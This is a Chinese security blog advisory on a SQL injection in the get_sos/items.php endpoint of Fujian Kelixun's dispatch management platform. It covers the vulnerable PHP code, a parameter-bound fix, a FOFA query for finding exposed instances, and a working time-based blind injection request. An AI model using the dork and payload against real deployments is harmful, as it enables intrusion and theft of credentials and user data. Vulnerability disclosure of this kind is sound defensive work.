---
title: "福建科立讯通信指挥调度管理平台 api/get_sos/items.php SQL注入漏洞"
source: https://mrxn.net/jswz/api-get_sos-items-usernumber-sqli.html
asset_dir: assets/福建科立讯通信指挥调度管理平台-apiget_sositems.php-sql注入漏洞
---

# 福建科立讯通信指挥调度管理平台 api/get\_sos/items.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/21 08:10
- 884浏览
- [0评论](#comment)
- 27分钟阅读

深入探索

计算机安全

代码安全审计

云安全解决方案

---

# 漏洞简介

福建科立讯通信指挥调度管理平台是一个专门针对通信行业的管理平台。福建科立讯通信指挥调度管理平台 api/get\_sos/items.php 接口处存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

# fofa语法

> `body="指挥调度管理平台"`

# 漏洞分析

api/get\_sos/items.php 文件内容如下

```
<?php

require_once "../../includes/require.php";
require_once "init_inc.php";

// sostype 1:断电报警 2：关机报警，3:拆除报警 5:通话报警
foreach ($result as $key => &$value) {
        $value['sostype']=get_type($value['sostype']);
}

$data['item']=$result;
$data['page']['total']=$num_rows;
$data['page']['page']=$page;
$data['page']['limit']=$limit;

$header['code'] = "1";
$header['msg'] = "处理成功";
$r['header'] = $header;
$r['data'] = $data;
echo json_encode($r);die;

?>
```

深入探索

授权

漏洞扫描服务

企业安全咨询

`$result` 来自 `api/get_sos/init_inc.php`文件，其中业务逻辑实现如下

```
<?php
require_once "../../includes/require.php";
// http://123.57.6.84/api/client/get_sos.php?usernumber=126&timestamp=100&sign=987f1883a97c5bc239ff4b353c2793db
//安全验证参数
$usernumber = $_REQUEST['usernumber']; //126
$timestamp  = $_REQUEST['timestamp'];  //100
$sign = $_REQUEST['sign'];  //987f1883a97c5bc239ff4b353c2793db
$page = check_str($_REQUEST['page'])?check_str($_REQUEST['page']):0;
if(empty($usernumber) || empty($timestamp) || empty($sign)){
    $_res = '{"header":{"code":"-1", "msg":"invalid params"}}';
    echo $_res;
    exit();
}

$enterprise_uuid = check_str($_REQUEST["enterprise_uuid"]);

//安全验证
$_sql = "select usr_password, usr_type from local_users where usr_operation<>'delete' and usr_number = '".$usernumber."' limit 1";
$_usr_password      = "";
$statement = $db->prepare(check_sql($_sql));
$statement->execute();
$result = $statement->fetchAll(PDO::FETCH_ASSOC);
if ($result != null) {
    $_usr_password  = $result[0]['usr_password'];  //123456
} else {
    $_res = '{"code":"-1", "msg":"user not found"}';
    echo $_res ;
    exit();
}
```

`usernumber` 直接拼接进SQL语句中执行，虽然经过了 `check_sql` 函数

```
if (!function_exists('check_sql')) {
    function check_sql($string) {
        return trim($string); //remove white space
    }
}
```

可以看到此函数仅仅是去除空白，无任何过滤。

虽然最终执行的时候使用了 pdo.prepare 方法预处理执行SQL，但是没有使用参数绑定传参，而是直接将`$_REQUEST['usernumber']` 直接被嵌入到 SQL 查询中，而没有经过任何过滤或转义，然后执行拼接后的SQL语句，等于卵用，最终造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

以下是修改后的安全传参方式

```
$usernumber = $_REQUEST['usernumber'];
$_sql = "SELECT usr_password, usr_type FROM local_users WHERE usr_operation <> 'delete' AND usr_number = :usernumber LIMIT 1";
$statement = $db->prepare($_sql);
$statement->bindParam(':usernumber', $usernumber, PDO::PARAM_STR);  // 绑定参数
$statement->execute();
$result = $statement->fetchAll(PDO::FETCH_ASSOC);
```

# 漏洞复现

## POC

```
GET /api/get_sos/items.php?sign=2&timestamp=1&usernumber=1'XOR(if(now()=sysdate(),SLEEP(5),0))XOR'A HTTP/1.1
Host: test.mrxn.net
```

[![福建科立讯通信指挥调度管理平台 api/get_sos/items.php SQL注入漏洞](images/img-001-fb3765e3e6a6.webp)](https://image.mrxn.net/414bc50049d740828e9ebdfa26d49464.webp)

成功延时 5 秒

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.POC](#toc-5-1-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
